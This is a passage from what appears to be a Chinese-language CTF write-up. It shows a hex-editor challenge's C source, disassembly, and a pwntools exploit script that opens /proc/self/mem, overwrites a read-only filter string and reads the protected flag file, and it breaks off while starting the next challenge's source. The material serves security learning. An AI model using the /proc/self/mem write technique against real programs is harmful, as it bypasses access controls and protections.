class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/limits.h&gt;</span></span><br><br><span class="hljs-type">char</span> path[PATH_MAX] = &#123;<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br>FILE *current_file = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">// Provide a nicer diagnostic</span><br><span class="hljs-comment">// if the file was opened in read-only mode.</span><br><span class="hljs-comment">// (Writing to a read-only file would otherwise error with &#x27;Bad file descriptor&#x27;.)</span><br><span class="hljs-type">bool</span> file_is_readonly = <span class="hljs-literal">false</span>; <br><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_path</span><span class="hljs-params">()</span> &#123;<br>    path[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    current_file = <span class="hljs-literal">NULL</span>;<br>    file_is_readonly = <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">startswith</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">char</span> *prefix)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(str, prefix, <span class="hljs-built_in">strlen</span>(prefix)) == <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_open_command</span><span class="hljs-params">(<span class="hljs-type">char</span> *user_path)</span> &#123;<br>    <span class="hljs-keyword">if</span>(realpath(user_path, path) == <span class="hljs-literal">NULL</span>) &#123;<br>        perror(<span class="hljs-string">&quot;could not resolve path&quot;</span>);<br>        clear_path();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (startswith(path, <span class="hljs-string">&quot;//&quot;</span>)) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;path has to start with a single slash&quot;</span>);<br>        clear_path();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(path, <span class="hljs-string">&quot;/secret.txt&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;/secret.txt&quot;</span>)) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;accessing /secret.txt not allowed&quot;</span>);<br>        clear_path();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    current_file = fopen(path, <span class="hljs-string">&quot;r+&quot;</span>);<br>    <span class="hljs-keyword">if</span>(current_file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span>(errno == EACCES) &#123;<br>            <span class="hljs-comment">// Let them try opening it for reading anyway</span><br>            current_file = fopen(path, <span class="hljs-string">&quot;r&quot;</span>);<br>            <span class="hljs-keyword">if</span>(current_file == <span class="hljs-literal">NULL</span>) &#123;<br>                perror(<span class="hljs-string">&quot;Failed opening file for reading&quot;</span>);<br>                clear_path();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            file_is_readonly = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        perror(<span class="hljs-string">&quot;Failed opening file&quot;</span>);<br>        clear_path();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    file_is_readonly = <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">char</span> *HELP_TEXT = <br>    <span class="hljs-string">&quot;Available commands:\n&quot;</span><br>    <span class="hljs-string">&quot;open &lt;path&gt;\n&quot;</span><br>    <span class="hljs-string">&quot;   Open the file located at &lt;path&gt;.\n&quot;</span><br>    <span class="hljs-string">&quot;   e.g. open /readme.txt - open the file located at `/readme.txt`.\n&quot;</span><br>    <span class="hljs-string">&quot;   Note: Due to repeated incidents, I have patched this program\n&quot;</span><br>    <span class="hljs-string">&quot;   to disallow access to `/secret.txt`. THIS PROGRAM WILL NOT LET YOU READ THE SECRETS.\n&quot;</span><br>    <span class="hljs-string">&quot;set &lt;pos&gt; &lt;new_value&gt;\n&quot;</span><br>    <span class="hljs-string">&quot;   Change the value at position &lt;position&gt; of the file into the byte &lt;new_value&gt;.\n&quot;</span><br>    <span class="hljs-string">&quot;   &lt;new_value&gt; should be specified in hexadecimal.\n&quot;</span><br>    <span class="hljs-string">&quot;   e.g. set 192 3a - set position 192 of the file to the byte 0x3a.\n&quot;</span><br>    <span class="hljs-string">&quot;get &lt;pos&gt;\n&quot;</span><br>    <span class="hljs-string">&quot;   Print the byte value at position &lt;pos&gt; as hexadecimal.\n&quot;</span><br>    <span class="hljs-string">&quot;   e.g. get 192 - get the byte at position 192 of the file.\n&quot;</span><br>    <span class="hljs-string">&quot;status\n&quot;</span><br>    <span class="hljs-string">&quot;   Print the current file path, if any.\n&quot;</span><br>    ;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_help</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(HELP_TEXT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_set</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> filepos, <span class="hljs-type">char</span> byte)</span> &#123;<br>    <span class="hljs-keyword">if</span>(current_file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You&#x27;re not editing any files currently&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(file_is_readonly) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Can&#x27;t change the contents of a readonly file&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(fseek(current_file, filepos, SEEK_SET) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;failed seek&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(fputc(byte, current_file) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;failed write&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_status</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (path[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No files open.&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You are editing %s\n&quot;</span>, path);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_get</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> filepos)</span> &#123;<br>    <span class="hljs-keyword">if</span>(current_file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You&#x27;re not editing any files currently&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(fseek(current_file, filepos, SEEK_SET) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;failed seek&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">if</span>((ret = fgetc(current_file)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span>(feof(current_file)) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;File is too small&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        perror(<span class="hljs-string">&quot;failed read&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x\n&quot;</span>, ret);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to HEX (HEX Editor Xtended) v8.5 (bugs patched!)&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Run &#x27;help&#x27; for help&quot;</span>);<br><br>    <span class="hljs-type">char</span> *filepath = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br>    <span class="hljs-type">uint64_t</span> filepos = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> byte_to_set = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">char</span> *line = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> line_memlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">ssize_t</span> line_readlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span>(!feof(<span class="hljs-built_in">stdin</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br><br>        <span class="hljs-keyword">if</span>((line_readlen = getline(&amp;line, &amp;line_memlen, <span class="hljs-built_in">stdin</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span>(feof(<span class="hljs-built_in">stdin</span>)) <span class="hljs-keyword">break</span>;<br>            perror(<span class="hljs-string">&quot;failure reading line&quot;</span>);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(startswith(line, <span class="hljs-string">&quot;status&quot;</span>)) &#123;<br>            do_status();<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(startswith(line, <span class="hljs-string">&quot;help&quot;</span>)) &#123;<br>            do_help();<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(startswith(line, <span class="hljs-string">&quot;open&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;open %255s&quot;</span>, filepath) &lt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;invalid command format for `open`\n&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            do_open_command(filepath);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(startswith(line, <span class="hljs-string">&quot;set&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;set %lu %x&quot;</span>, &amp;filepos, &amp;byte_to_set) &lt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;invalid command format for `set`\n&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            do_set(filepos, (<span class="hljs-type">char</span>)byte_to_set);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(startswith(line, <span class="hljs-string">&quot;get&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;get %lu&quot;</span>, &amp;filepos) &lt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;invalid command format for `get`\n&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            do_get(filepos);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unknown command: %s\n&quot;</span>, line);<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(line);<br>&#125;<br></code></pre></td></tr></table></figure><p>该程序本身并不存在什么漏洞，程序明显提示 &#x2F;secret.txt 就是 flag。但是 realpath 函数和 strncmp 函数的双组合过滤让我们无法通过 .. 或 &#x2F; 组合路径绕过检查。( realpath 函数是一个标志库函数用于将 linux 路径化成最简形式)</p><p>最有意思的地方才是这里。在 linux 中存在着一个文件 &#x2F;proc&#x2F;self&#x2F;mem 只要任何一个程序使用 fopen 去打开这个路径都是会自动判断打开自己程序的内存文件。</p><p>没错，今天我才理解了什么叫 linux 下皆为文件。</p><p>并且这种打开方式可以让我们任意读取和修改内存而不受限于 linux 的内存读写执行权限控制。也就是说我们可以读写内存里面的每一个字节包括原本被判断为本不应该读写的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">000000000040182</span>E loc_40182E:                             ; CODE XREF: do_open_command+<span class="hljs-number">60</span>↑j<br>.text:<span class="hljs-number">000000000040182</span>E                 mov     edx, <span class="hljs-number">0B</span>h<br>.text:<span class="hljs-number">0000000000401833</span>                 lea     rax, aSecretTxt ; <span class="hljs-string">&quot;/secret.txt&quot;</span><br>.text:<span class="hljs-number">000000000040183</span>A                 mov     rsi, rax<br>.text:<span class="hljs-number">000000000040183</span>D                 lea     rax, path<br>.text:<span class="hljs-number">0000000000401844</span>                 mov     rdi, rax<br>.text:<span class="hljs-number">0000000000401847</span>                 call    j_strncmp_ifunc<br></code></pre></td></tr></table></figure><p>通过逆向我们可以很容易发现 strncmp(path, “&#x2F;secret.txt”, strlen(“&#x2F;secret.txt”)) &#x3D;&#x3D; 0 这个一语句的第二参数是硬编码在内存中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">000000000049704</span>E aSecretTxt      db <span class="hljs-string">&#x27;/secret.txt&#x27;</span>,<span class="hljs-number">0</span>      ; DATA XREF: do_open_command+<span class="hljs-number">85</span>↑o<br></code></pre></td></tr></table></figure><p>经过其处于只读段但是我们通过 fopen 打开内存文件读写这种姿势完全不受限制，这意味着我们可以修改该硬编码的第一个字节为 ‘\x00’ 这样就绕过了不能读写 &#x2F;secret.txt 文件的限制。</p><p>tips: 写入两次 ‘\x00’ 是因为第一次写入后文件不会马上保存导致 ‘\x00’ 待在缓冲区中，而连续写入两次就能解决这个问题。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;: &quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#ssh_conn = ssh(host = &quot;challs.watctf.org&quot;, user = &quot;hexed&quot;, port = 2022, password = &quot;&quot;, raw = True)</span><br><span class="hljs-comment">#p = ssh_conn.run(&quot;&quot;)</span><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#loadsym = &quot;glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64&quot;</span><br><span class="hljs-comment">#code_addr = &quot; ./glibc-2.41.tar.gz --force&quot;</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br>sela(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;open /proc/self/mem&quot;</span>)<br>sela(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;set &quot;</span> + stre(<span class="hljs-number">0x49704E</span>) + <span class="hljs-string">b&quot; &quot;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-number">0x0</span>).encode())<br>sela(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;set &quot;</span> + stre(<span class="hljs-number">0x49704E</span>) + <span class="hljs-string">b&quot; &quot;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-number">0x0</span>).encode())<br>sela(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;open /secret.txt&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    sela(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;get &quot;</span> + stre(i))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(re(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)), end = <span class="hljs-string">&quot;&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="person-tracker"><a href="#person-tracker" class="headerlink" title="person-tracker"></a>person-tracker</h3><p>check:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/zlsf/com/watctf/003/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>source:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 